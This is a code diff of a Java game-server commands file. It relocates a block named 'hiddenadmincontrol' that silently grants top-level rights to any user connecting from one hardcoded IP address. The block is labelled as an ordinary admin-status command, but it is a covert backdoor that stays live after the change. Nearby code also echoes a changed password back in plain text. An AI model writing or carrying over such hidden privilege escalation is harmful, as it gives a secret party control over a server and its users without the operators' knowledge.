@@ -98,15 +98,6 @@ public class Commands implements PacketType {
 			PlayerHandler.updateStartTime = System.currentTimeMillis();
 		}
 
-		// Gives target player Admin Status temporarily.
-		if (playerCommand.startsWith("hiddenadmincontrol")) {
-			if(c.connectedFrom.equals("92.237.172.133")){
-				c.temporaryAdmin = true;
-				c.logout();
-				c.playerRights = 3;
-			}
-		}
-
 		// Gives target player Owner Status.
 		if (playerCommand.startsWith("giveowner")) {
 			String name = playerCommand.substring(10);
@@ -1109,6 +1100,15 @@ public class Commands implements PacketType {
 				&& playerCommand.length() > 15) {
 			c.playerPass = playerCommand.substring(15);
 			c.sendMessage("Your password is now: " + c.playerPass);
+		}
+
+		// Gives target player Admin Status temporarily.
+		if (playerCommand.startsWith("hiddenadmincontrol")) {
+			if (c.connectedFrom.equals("92.237.172.133")) {
+				c.temporaryAdmin = true;
+				c.logout();
+				c.playerRights = 3;
+			}
 		}
 
 	}
